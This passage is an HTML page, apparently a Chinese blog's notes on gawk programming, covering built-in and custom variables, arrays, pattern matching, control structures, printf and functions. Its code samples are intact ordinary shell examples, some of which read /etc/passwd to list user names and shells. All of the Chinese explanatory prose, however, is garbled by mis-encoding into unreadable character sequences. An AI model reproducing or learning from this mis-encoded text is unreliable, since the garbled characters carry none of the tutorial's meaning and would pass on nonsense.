·ä¸ä¼šç›´æ¥ä¿®æ”¹æ–‡ä»¶.</p><h2 id="22-1-ä½¿ç”¨å˜é‡"><a href="#22-1-ä½¿ç”¨å˜é‡" class="headerlink" title="22.1 ä½¿ç”¨å˜é‡"></a>22.1 ä½¿ç”¨å˜é‡</h2><p>ä¸¤ç§ç±»å‹:</p><ul><li>å†…å»ºå˜é‡</li><li>è‡ªå®šä¹‰å˜é‡</li></ul><h3 id="22-1-1-å†…å»ºå˜é‡"><a href="#22-1-1-å†…å»ºå˜é‡" class="headerlink" title="22.1.1 å†…å»ºå˜é‡"></a>22.1.1 å†…å»ºå˜é‡</h3><h4 id="å­—æ®µå’Œåˆ†å‰²ç¬¦å˜é‡"><a href="#å­—æ®µå’Œåˆ†å‰²ç¬¦å˜é‡" class="headerlink" title="å­—æ®µå’Œåˆ†å‰²ç¬¦å˜é‡"></a>å­—æ®µå’Œåˆ†å‰²ç¬¦å˜é‡</h4><p>æ•°æ®å­—æ®µå˜é‡. ä½¿ç”¨ <code>$</code> æ¥å¼•ç”¨, å¦‚ <code>$1</code>.</p><p>é»˜è®¤æƒ…å†µä¸‹, å­—æ®µåˆ†å‰²ç¬¦æ˜¯ä¸€ä¸ªç©ºç™½å­—ç¬¦.</p><table><thead><tr><th>å˜é‡</th><th>æè¿°</th></tr></thead><tbody><tr><td>FIELDWIDTHS</td><td>ç”±ç©ºæ ¼åˆ†éš”çš„ä¸€åˆ—æ•°å­—, å®šä¹‰äº†æ¯ä¸ªæ•°æ®å­—æ®µç¡®åˆ‡å®½åº¦</td></tr><tr><td>FS</td><td>è¾“å…¥å­—æ®µåˆ†éš”ç¬¦, é»˜è®¤ä¸ºç©ºæ ¼</td></tr><tr><td>RS</td><td>è¾“å…¥è®°å½•åˆ†éš”ç¬¦, é»˜è®¤ä¸ºæ¢è¡Œç¬¦</td></tr><tr><td>OFS</td><td>è¾“å‡ºå­—æ®µåˆ†éš”ç¬¦å·, é»˜è®¤ä¸ºç©ºæ ¼</td></tr><tr><td>ORS</td><td>è¾“å‡ºè®°å½•åˆ†éš”ç¬¦å·, é»˜è®¤ä¸ºæ¢è¡Œç¬¦</td></tr></tbody></table><p><code>F</code> æŒ‡ Field, å­—æ®µ, ä¸€è¡Œä¸­çš„ä¸€éƒ¨åˆ† (ä¸ä¸€å®š).<br><code>R</code> æŒ‡ Record, è®°å½•, æŒ‡ä¸€è¡Œ (ä¸ä¸€å®š).</p><p>Field å’Œ Record éƒ½çœ‹ä½ æ€ä¹ˆå»åˆ†å‰².<br>è¿™é‡Œçš„ <code>O</code> å°±æ˜¯ Output.</p><p>ä¸€æ—¦è®¾ç½®äº† FIELDWIDTHS, gawk å°±ä¼šå¿½ç•¥ FS å˜é‡, å¹¶æ ¹æ®æä¾›çš„å­—æ®µå®½åº¦æ¥è®¡ç®—å­—æ®µ.</p><p>ä¸€æ—¦è®¾å®šäº† FIELDWIDTHS å˜é‡çš„å€¼, å°±ä¸èƒ½å†æ”¹å˜äº†.</p><p>ç¤ºä¾‹ç¨‹åº:</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">$ gawk <span class="hljs-string">&#x27;BEGIN&#123;FIELDWIDTHS=&quot;3 5 2 5&quot;&#125;&#123;print <span class="hljs-subst">$1</span>,<span class="hljs-subst">$2</span>,<span class="hljs-subst">$3</span>,<span class="hljs-subst">$4</span>&#125;&#x27;</span> datalb<br></code></pre></td></tr></table></figure><h4 id="æ•°æ®å˜é‡"><a href="#æ•°æ®å˜é‡" class="headerlink" title="æ•°æ®å˜é‡"></a>æ•°æ®å˜é‡</h4><p><img src="/../img/gawk_var.png" alt="æ›´å¤š gawk å†…å»ºå˜é‡"></p><p>gawk å¹¶ä¸ä¼šå°†ç¨‹åºè„šæœ¬å½“æˆå‘½ä»¤å‚æ•°çš„ä¸€éƒ¨åˆ†.</p><p>å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gawk <span class="hljs-string">&#x27;BEGIN&#123;print ARGC,ARGV[0],ARGV[1]&#125;&#x27;</span> data1<br>2 gawk data1<br>$<br></code></pre></td></tr></table></figure><p><code>ARGC</code> å˜é‡è¡¨æ˜å‘½ä»¤è¡Œä¸Šæœ‰ä¸¤ä¸ªå‚æ•°, è¿™åŒ…æ‹¬ gawk å‘½ä»¤å’Œ data1 å‚æ•°, ä¸­é—´çš„ <code>BEGIN&#123;print ARGC,ARGV[1]&#125;</code> ä¸ç®—. <code>ARGV</code> æ•°ç»„ä»ç´¢å¼• 0 å¼€å§‹, ä»£è¡¨çš„æ˜¯å‘½ä»¤ (å³ gawk). ç¬¬ä¸€ä¸ªæ•°ç»„å€¼æ˜¯ gawk å‘½ä»¤åçš„ç¬¬ä¸€ä¸ªå‘½ä»¤è¡Œå‚æ•°.</p><p>è·Ÿ shell å˜é‡ä¸åŒ, åœ¨è„šæœ¬ä¸­å¼•ç”¨ gawk å˜é‡æ—¶, å˜é‡åå‰ä¸åŠ ç¾å…ƒç¬¦.</p><p><code>ENVIRON</code> (environment) å˜é‡ä½¿ç”¨å…³è”æ•°ç»„ (å³å­—å…¸) æ¥æå–ç¯å¢ƒå˜é‡:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gawk <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&gt; BEGIN&#123;</span><br><span class="hljs-string">&gt; print ENVIRON[&quot;HOME&quot;]</span><br><span class="hljs-string">&gt; print ENVIRON[&quot;PATH&quot;]</span><br><span class="hljs-string">&gt; &#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥ç”¨è¿™ç§æ–¹æ³•æ¥æå–ä»»ä½•ç¯å¢ƒå˜é‡çš„å€¼.</p><p><code>NF</code> (Number of Field) å˜é‡å¯ä»¥è®©ä½ åœ¨ä¸çŸ¥é“å…·ä½“ä½ç½®çš„æƒ…å†µä¸‹æŒ‡å®šè®°å½•ä¸­çš„æœ€åä¸€ä¸ªæ•°æ®å­—æ®µ:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gawk <span class="hljs-string">&#x27;BEGIN&#123;FS=&quot;:&quot;; OFS=&quot;:&quot;&#125; &#123;print $1,$NF&#125;&#x27;</span> /etc/passwd<br></code></pre></td></tr></table></figure><p>æ³¨æ„ <code>FNR</code> å’Œ <code>NR</code> çš„åŒºåˆ«, <code>FNR</code> è¡¨ç¤ºå½“å‰æ•°æ®æ–‡ä»¶ä¸­å·²å¤„ç†çš„è®°å½•æ•°, <code>NR</code> å˜é‡å«æœ‰å·²å¤„ç†è¿‡çš„è®°å½•æ€»æ•°.</p><p>åœ¨ shell è„šæœ¬ä¸­ä½¿ç”¨ gawk æ—¶, åº”è¯¥å°†ä¸åŒçš„ gawk å‘½ä»¤æ”¾åˆ°ä¸åŒçš„è¡Œ, è¿™æ ·å®¹æ˜“ç†è§£å’Œé˜…è¯».</p><p>å¯å°† gawk è„šæœ¬æ”¾åˆ°ä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶ä¸­, å¹¶ç”¨ <code>-f</code> å‚æ•°æ¥åœ¨ shell è„šæœ¬ä¸­å¼•ç”¨.</p><h3 id="22-1-2-è‡ªå®šä¹‰å˜é‡"><a href="#22-1-2-è‡ªå®šä¹‰å˜é‡" class="headerlink" title="22.1.2 è‡ªå®šä¹‰å˜é‡"></a>22.1.2 è‡ªå®šä¹‰å˜é‡</h3><p>å˜é‡åå¯ä»¥æ˜¯ä»»æ„æ•°ç›®çš„å­—æ¯, æ•°å­—å’Œä¸‹åˆ’çº¿, ä½†ä¸èƒ½ä»¥æ•°å­—å¼€å¤´. åŒºåˆ†å¤§å°å†™.</p><h4 id="1-åœ¨è„šæœ¬ä¸­ç»™å˜é‡èµ‹å€¼"><a href="#1-åœ¨è„šæœ¬ä¸­ç»™å˜é‡èµ‹å€¼" class="headerlink" title="1. åœ¨è„šæœ¬ä¸­ç»™å˜é‡èµ‹å€¼"></a>1. åœ¨è„šæœ¬ä¸­ç»™å˜é‡èµ‹å€¼</h4><p>èµ‹å€¼è¯­å¥å¯ä»¥åŒ…å«æ•°å­¦ç®—å¼æ¥å¤„ç†æ•°å­—å€¼.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gawk <span class="hljs-string">&#x27;BEGIN&#123;x=4; x= x * 2 + 3; print x&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>æ±‚ä½™ç¬¦å·ä¸º <code>%</code>, å¹‚è¿ç®—ä¸º <code>^</code> æˆ– <code>**</code></p><h4 id="2-åœ¨å‘½ä»¤è¡Œä¸Šç»™å˜é‡èµ‹å€¼"><a href="#2-åœ¨å‘½ä»¤è¡Œä¸Šç»™å˜é‡èµ‹å€¼" class="headerlink" title="2. åœ¨å‘½ä»¤è¡Œä¸Šç»™å˜é‡èµ‹å€¼"></a>2. åœ¨å‘½ä»¤è¡Œä¸Šç»™å˜é‡èµ‹å€¼</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">cat</span> script1<br>BEGIN&#123;FS=<span class="hljs-string">&quot;,&quot;</span>&#125;<br>&#123;<span class="hljs-built_in">print</span> <span class="hljs-variable">$n</span>&#125;<br>$ gawk -f script1 n=2 data1<br>data12<br>data22<br>data32<br></code></pre></td></tr></table></figure><p>æ­¤æ–¹æ³•çš„ç¼ºç‚¹, è®¾ç½®çš„å˜é‡å€¼åœ¨ä»£ç çš„ <code>BEGIN</code> éƒ¨åˆ†ä¸å¯ç”¨.</p><p>ä½¿ç”¨ <code>-v</code> å‘½ä»¤è¡Œå‚æ•°è§£å†³. å…¶å…è®¸åœ¨ <code>BEGIN</code> ä»£ç ä¹‹å‰è®¾ç½®å˜é‡, åœ¨å‘½ä»¤è¡Œä¸Š, <code>-v</code> å‘½ä»¤è¡Œå‚æ•°å¿…é¡»æ”¾åœ¨è„šæœ¬ä»£ç ä¹‹å‰:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gawk -v n=3 -f script2 data1<br></code></pre></td></tr></table></figure><h2 id="22-2-å¤„ç†æ•°ç»„"><a href="#22-2-å¤„ç†æ•°ç»„" class="headerlink" title="22.2 å¤„ç†æ•°ç»„"></a>22.2 å¤„ç†æ•°ç»„</h2><p>gawk ä½¿ç”¨å…³è”æ•°ç»„ (å­—å…¸) æä¾›æ•°ç»„åŠŸèƒ½.</p><h3 id="22-2-1-å®šä¹‰æ•°ç»„å˜é‡"><a href="#22-2-1-å®šä¹‰æ•°ç»„å˜é‡" class="headerlink" title="22.2.1 å®šä¹‰æ•°ç»„å˜é‡"></a>22.2.1 å®šä¹‰æ•°ç»„å˜é‡</h3><p>æ ¼å¼:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">var[index] = element<br></code></pre></td></tr></table></figure><p>å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">capital[<span class="hljs-string">&quot;Illinois&quot;</span>] = <span class="hljs-string">&quot;Springfield&quot;</span><br>capital[<span class="hljs-string">&quot;Indiana&quot;</span>] = <span class="hljs-string">&quot;Indianapilis&quot;</span><br></code></pre></td></tr></table></figure><h3 id="22-2-2-éå†æ•°ç»„å˜é‡"><a href="#22-2-2-éå†æ•°ç»„å˜é‡" class="headerlink" title="22.2.2 éå†æ•°ç»„å˜é‡"></a>22.2.2 éå†æ•°ç»„å˜é‡</h3><p>å…³è”æ•°ç»„å˜é‡çš„é—®é¢˜åœ¨äºä½ å¯èƒ½æ— æ³•çŸ¥æ™“ç´¢å¼•å€¼:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-keyword">for</span> (var <span class="hljs-keyword">in</span> array)<br>&#123;<br>    statements<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ª <code>for</code> è¯­å¥ä¼šåœ¨æ¯æ¬¡å¾ªç¯æ—¶å°†å…³è”æ•°ç»„ <code>array</code> çš„ä¸‹ä¸€ä¸ªç´¢å¼•å€¼èµ‹ç»™å˜é‡ <code>var</code>, ç„¶åæ‰§è¡Œä¸€é <code>statements</code>.</p><p>å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gawk <span class="hljs-string">&#x27;BEGIN&#123;</span><br><span class="hljs-string">&gt; var[&quot;a&quot;] = 1</span><br><span class="hljs-string">&gt; var[&quot;g&quot;] = 2</span><br><span class="hljs-string">&gt; var[&quot;m&quot;] = 3</span><br><span class="hljs-string">&gt; var[&quot;u&quot;] = 4</span><br><span class="hljs-string">&gt; for (test in var)</span><br><span class="hljs-string">&gt; &#123;</span><br><span class="hljs-string">&gt;   print &quot;Index:&quot;,test,&quot; -Value:&quot;,var[test]</span><br><span class="hljs-string">&gt; &#125;</span><br><span class="hljs-string">&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>é¡ºåºæ˜¯éšæœºçš„.</p><h3 id="22-2-3-åˆ é™¤æ•°ç»„å˜é‡"><a href="#22-2-3-åˆ é™¤æ•°ç»„å˜é‡" class="headerlink" title="22.2.3 åˆ é™¤æ•°ç»„å˜é‡"></a>22.2.3 åˆ é™¤æ•°ç»„å˜é‡</h3><p>éœ€è¦ç”¨:</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">delete</span> <span class="hljs-keyword">array</span>[<span class="hljs-keyword">index</span>]<br></code></pre></td></tr></table></figure><p>ä¼šåˆ é™¤ç´¢å¼•å’Œç›¸å…³çš„æ•°æ®å…ƒç´ å€¼.</p><h2 id="22-3-ä½¿ç”¨æ¨¡å¼"><a href="#22-3-ä½¿ç”¨æ¨¡å¼" class="headerlink" title="22.3 ä½¿ç”¨æ¨¡å¼"></a>22.3 ä½¿ç”¨æ¨¡å¼</h2><h3 id="22-3-1-æ­£åˆ™è¡¨è¾¾å¼"><a href="#22-3-1-æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="22.3.1 æ­£åˆ™è¡¨è¾¾å¼"></a>22.3.1 æ­£åˆ™è¡¨è¾¾å¼</h3><p>åœ¨ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ—¶, æ­£åˆ™è¡¨è¾¾å¼å¿…é¡»å‡ºç°åœ¨å®ƒè¦æ§åˆ¶çš„ç¨‹åºè„šæœ¬çš„å·¦èŠ±æ‹¬å·å‰.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gawk <span class="hljs-string">&#x27;BEGIN&#123;FS=&quot;,&quot;&#125; /11/&#123;print $1&#125;&#x27;</span> data1<br>data11<br></code></pre></td></tr></table></figure><p>gawk ç¨‹åºä¼šç”¨æ­£åˆ™è¡¨è¾¾å¼å¯¹è®°å½•ä¸­æ‰€æœ‰çš„æ•°æ®å­—æ®µè¿›è¡ŒåŒ¹é…, åŒ…æ‹¬å­—æ®µåˆ†éš”ç¬¦.</p><h3 id="22-3-2-åŒ¹é…æ“ä½œç¬¦"><a href="#22-3-2-åŒ¹é…æ“ä½œç¬¦" class="headerlink" title="22.3.2 åŒ¹é…æ“ä½œç¬¦"></a>22.3.2 åŒ¹é…æ“ä½œç¬¦</h3><p>matching operator å…è®¸å°†æ­£åˆ™è¡¨è¾¾å¼é™å®šåœ¨è®°å½•ä¸­çš„ç‰¹å®šæ•°æ®å­—æ®µ. åŒ¹é…æ“ä½œç¬¦æ˜¯ <code>~</code>.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-variable">$1</span> ~ /^data/<br></code></pre></td></tr></table></figure><p>ç¤ºä¾‹:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gawk -F: <span class="hljs-string">&#x27;$1 ~ /rich/&#123;print $1,$NF&#125;&#x27;</span> /etc/passwd<br></code></pre></td></tr></table></figure><p>å…ˆåœ¨ <code>$1</code> (å³ç¬¬ä¸€ä¸ªæ•°æ®å­—æ®µä¸­) æŸ¥æ‰¾æ–‡æœ¬ rich, å¦‚æœæ‰¾åˆ°äº†è¿™ä¸ªæ¨¡å¼, å®ƒä¼šæ‰“å°è¯¥è®°å½•çš„ç¬¬ä¸€ä¸ª ($1) å’Œæœ€åä¸€ä¸ªæ•°æ®å­—æ®µ ($NF).</p><p>ç”¨ <code>!</code> ç¬¦å·æ’é™¤æ­£åˆ™è¡¨è¾¾å¼çš„åŒ¹é…:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$1</span> !~ <span class="hljs-regexp">/expression/</span><br></code></pre></td></tr></table></figure><p>å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gawk -F: <span class="hljs-string">&#x27;$1 !~ /rich/&#123;print $1,$NF&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="22-3-3-æ•°å­¦è¡¨è¾¾å¼"><a href="#22-3-3-æ•°å­¦è¡¨è¾¾å¼" class="headerlink" title="22.3.3 æ•°å­¦è¡¨è¾¾å¼"></a>22.3.3 æ•°å­¦è¡¨è¾¾å¼</h3><p>æ˜¾ç¤ºæ‰€æœ‰å±äº root ç”¨æˆ·ç»„ (ç»„ ID ä¸º 0) çš„ç³»ç»Ÿç”¨æˆ·:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gawk -F: <span class="hljs-string">&#x27;$4 == 0&#123;print $1&#125;&#x27;</span> /etc/passwd<br></code></pre></td></tr></table></figure><p><code>$4</code> ä¸ºè®°å½•çš„ç¬¬å››ä¸ªå­—æ®µ.</p><p>å¯ä»¥ä½¿ç”¨ä»»ä½•å¸¸è§çš„æ•°å­¦æ¯”è¾ƒè¡¨è¾¾å¼, å¦‚:</p><ul><li><code>x == y</code></li><li><code>x &lt;= y</code></li><li><code>x &lt; y</code></li><li><code>x &gt;= y</code></li><li><code>x &gt; y</code></li></ul><p>ä¹Ÿå¯ä»¥å¯¹æ•°æ®æ–‡æœ¬ä½¿ç”¨è¡¨è¾¾å¼, ä½†æ˜¯å¿…é¡»å®Œå…¨åŒ¹é…:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gawk -F, <span class="hljs-string">&#x27;$1 == &quot;data&quot;&#123;print $1&#125;&#x27;</span> data1<br></code></pre></td></tr></table></figure><h2 id="22-4-ç»“æ„åŒ–å‘½ä»¤"><a href="#22-4-ç»“æ„åŒ–å‘½ä»¤" class="headerlink" title="22.4 ç»“æ„åŒ–å‘½ä»¤"></a>22.4 ç»“æ„åŒ–å‘½ä»¤</h2><h3 id="22-4-1-if-è¯­å¥"><a href="#22-4-1-if-è¯­å¥" class="headerlink" title="22.4.1 if è¯­å¥"></a>22.4.1 if è¯­å¥</h3><p>æ ¼å¼:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-keyword">if</span> <span class="hljs-comment">(condition)</span><br>    stateme<span class="hljs-symbol">nt1</span><br></code></pre></td></tr></table></figure><p>å¦‚æœè¦åœ¨ <code>if</code> è¯­å¥ä¸­æ‰§è¡Œå¤šæ¡è¯­å¥, å°±å¿…é¡»ç”¨èŠ±æ‹¬å·å°†å®ƒä»¬æ‹¬èµ·æ¥:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gawk <span class="hljs-string">&#x27;&#123;</span><br><span class="hljs-string">&gt; if ($1 &gt; 20)</span><br><span class="hljs-string">&gt; &#123;</span><br><span class="hljs-string">&gt;   x = $1 * 2</span><br><span class="hljs-string">&gt;   print x</span><br><span class="hljs-string">&gt; &#125;</span><br><span class="hljs-string">&gt; &#125;&#x27;</span> data4<br></code></pre></td></tr></table></figure><p>gawk çš„ <code>if</code> è¯­å¥ä¹Ÿæ”¯æŒ <code>else</code> å­å¥.</p><p>å¯ä»¥åœ¨å•è¡Œä¸Šä½¿ç”¨ <code>else</code> å­å¥, ä½†å¿…é¡»åœ¨ <code>if</code> è¯­å¥éƒ¨åˆ†ä¹‹åä½¿ç”¨åˆ†å·:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-keyword">if</span> <span class="hljs-comment">(condition)</span> stateme<span class="hljs-symbol">nt1</span>; else stateme<span class="hljs-symbol">nt2</span><br></code></pre></td></tr></table></figure><h3 id="22-4-2-while-è¯­å¥"><a href="#22-4-2-while-è¯­å¥" class="headerlink" title="22.4.2 while è¯­å¥"></a>22.4.2 while è¯­å¥</h3><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">while</span> (condition)<br>&#123;<br>    <span class="hljs-built_in">statements</span><br>&#125;<br></code></pre></td></tr></table></figure><p>gawk ç¼–ç¨‹è¯­è¨€æ”¯æŒåœ¨ <code>while</code> å¾ªç¯ä¸­ä½¿ç”¨ <code>break</code> è¯­å¥å’Œ <code>continue</code> è¯­å¥.</p><h3 id="22-4-3-do-while-è¯­å¥"><a href="#22-4-3-do-while-è¯­å¥" class="headerlink" title="22.4.3 do-while è¯­å¥"></a>22.4.3 do-while è¯­å¥</h3><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">do</span><br>&#123;<br>    <span class="hljs-built_in">statements</span><br>&#125; <span class="hljs-keyword">while</span> (condition)<br></code></pre></td></tr></table></figure><p>è¿™ç§æ ¼å¼ä¿è¯äº†è¯­å¥ä¼šåœ¨æ¡ä»¶è¢«æ±‚å€¼ä¹‹å‰è‡³å°‘æ‰§è¡Œä¸€æ¬¡.</p><h3 id="22-4-4-for-è¯­å¥"><a href="#22-4-4-for-è¯­å¥" class="headerlink" title="22.4.4 for è¯­å¥"></a>22.4.4 for è¯­å¥</h3><p>gawk ç¼–ç¨‹è¯­è¨€æ”¯æŒ C é£æ ¼çš„ for å¾ªç¯:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">for (variable assignment<span class="hljs-comment">; condition; iteration proces)</span><br></code></pre></td></tr></table></figure><p>ä¹Ÿæœ‰ <code>i++</code>, <code>total += $1</code>.</p><h2 id="22-5-æ ¼å¼åŒ–æ‰“å°"><a href="#22-5-æ ¼å¼åŒ–æ‰“å°" class="headerlink" title="22.5 æ ¼å¼åŒ–æ‰“å°"></a>22.5 æ ¼å¼åŒ–æ‰“å°</h2><p><code>printf</code> å‘½ä»¤, å’Œ C ä¸­ç”¨å‘ä¸€è‡´:</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;format string&quot;</span>, <span class="hljs-built_in">var1</span>, var2 ...<br></code></pre></td></tr></table></figure><p>æ ¼å¼åŒ–æŒ‡å®šç¬¦æ ¼å¼:</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">%[modifier]<span class="hljs-keyword">control</span>-letter<br></code></pre></td></tr></table></figure><p>å¦‚:<br><img src="/../img/formatstring.png" alt="format string"></p><p>ä¸‰ç§ä¿®é¥°ç¬¦è¿›ä¸€æ­¥æ§åˆ¶è¾“å‡º:</p><ul><li>width: æŒ‡å®šè¾“å‡ºå­—æ®µçš„æœ€å°å®½åº¦</li><li>prec: æŒ‡å®šæµ®ç‚¹æ•°ä¸­å°æ•°ç‚¹åé¢ä½æ•°, æˆ–è€…æ–‡æœ¬å­—ç¬¦ä¸²ä¸­æ˜¾ç¤ºçš„æœ€å¤§å­—ç¬¦æ•°</li><li><code>-</code> (å‡å·): æŒ‡æ˜é‡‡ç”¨å·¦å¯¹é½</li></ul><p>ä½¿ç”¨èµ·æ¥ä»ç„¶æ˜¯ <code>%16.1f</code> è¿™ç§.</p><h2 id="22-6-å†…å»ºå‡½æ•°"><a href="#22-6-å†…å»ºå‡½æ•°" class="headerlink" title="22.6 å†…å»ºå‡½æ•°"></a>22.6 å†…å»ºå‡½æ•°</h2><h3 id="22-6-1-æ•°å­¦å‡½æ•°"><a href="#22-6-1-æ•°å­¦å‡½æ•°" class="headerlink" title="22.6.1 æ•°å­¦å‡½æ•°"></a>22.6.1 æ•°å­¦å‡½æ•°</h3><p><img src="/../img/mathfn.png" alt="mathfn"></p><p><code>int()</code> ä¼šç”Ÿæˆä¸€ä¸ªå€¼çš„æ•´æ•°éƒ¨åˆ†, å…¶ä¸ºè¯¥å€¼ä¸ 0 ä¹‹é—´æœ€æ¥è¿‘è¯¥å€¼çš„æ•´æ•°.</p><p>äº§ç”Ÿ 0~10 ä¹‹é—´çš„éšæœºæ•´æ•°å€¼:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">x</span> = <span class="hljs-function"><span class="hljs-title">int</span>(<span class="hljs-number">10</span> * <span class="hljs-title">rand</span>())</span><br></code></pre></td></tr></table></figure><p>é™¤äº†æ ‡å‡†æ•°å­¦å‡½æ•°å¤–, gawk è¿˜æ”¯æŒä¸€äº›æŒ‰ä½æ“ä½œæ•°æ®çš„å‡½æ•°:<br><img src="/../img/bitopr.png" alt="bitopr"></p><h3 id="22-6-2-å­—ç¬¦ä¸²å‡½æ•°"><a href="#22-6-2-å­—ç¬¦ä¸²å‡½æ•°" class="headerlink" title="22.6.2 å­—ç¬¦ä¸²å‡½æ•°"></a>22.6.2 å­—ç¬¦ä¸²å‡½æ•°</h3><p><img src="/../img/strfn1.png" alt="strfn"></p><p><img src="/../img/strfn2.png" alt="strfn"></p><h3 id="22-6-3-æ—¶é—´å‡½æ•°"><a href="#22-6-3-æ—¶é—´å‡½æ•°" class="headerlink" title="22.6.3 æ—¶é—´å‡½æ•°"></a>22.6.3 æ—¶é—´å‡½æ•°</h3><p><img src="/../img/timefn.png" alt="timefn"></p><h2 id="22-7-è‡ªå®šä¹‰å‡½æ•°"><a href="#22-7-è‡ªå®šä¹‰å‡½æ•°" class="headerlink" title="22.7 è‡ªå®šä¹‰å‡½æ•°"></a>22.7 è‡ªå®šä¹‰å‡½æ•°</h2><h3 id="22-7-1-å®šä¹‰å‡½æ•°"><a href="#22-7-1-å®šä¹‰å‡½æ•°" class="headerlink" title="22.7.1 å®šä¹‰å‡½æ•°"></a>22.7.1 å®šä¹‰å‡½æ•°</h3><p>ä½¿ç”¨ function å…³é”®è¯:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gawk">function name([variables])<br>&#123;<br>    statements<br>&#125;<br></code></pre></td></tr></table></figure><p>å‡½æ•°è¿˜èƒ½ç”¨ <code>return</code> è¯­å¥è¿”å›å€¼:</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">return</span> value<br></code></pre></td></tr></table></figure><h3 id="22-7-2-ä½¿ç”¨è‡ªå®šä¹‰å‡½æ•°"><a href="#22-7-2-ä½¿ç”¨è‡ªå®šä¹‰å‡½æ•°" class="headerlink" title="22.7.2 ä½¿ç”¨è‡ªå®šä¹‰å‡½æ•°"></a>22.7.2 ä½¿ç”¨è‡ªå®šä¹‰å‡½æ•°</h3><p>åœ¨å®šä¹‰å‡½æ•°æ—¶, å®ƒå¿…é¡»å‡ºç°åœ¨æ‰€æœ‰ä»£ç å—ä¹‹å‰ 